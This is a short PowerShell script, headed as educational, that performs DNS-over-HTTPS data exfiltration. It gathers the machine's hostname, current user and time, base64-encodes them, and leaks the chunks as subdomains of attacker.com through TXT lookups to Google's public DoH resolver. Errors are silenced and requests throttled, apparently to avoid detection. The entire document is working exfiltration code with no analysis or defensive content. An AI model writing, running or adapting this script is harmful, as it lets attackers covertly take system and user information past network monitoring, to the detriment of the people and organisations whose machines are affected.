# DNS-over-HTTPS exfiltration script (Educational use only)
$Data = "hostname=$(hostname)&user=$(whoami)&time=$(Get-Date)"
$Base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Data))
$Chunks = $Base64 -split '(.{50})' | Where-Object { $_ }

foreach ($chunk in $Chunks) {
    $url = "https://dns.google/resolve?name=$chunk.attacker.com&type=TXT"
    try {
        Invoke-WebRequest -Uri $url -UseBasicParsing | Out-Null
    } catch {
        # Silent fail
    }
    Start-Sleep -Seconds 1
}
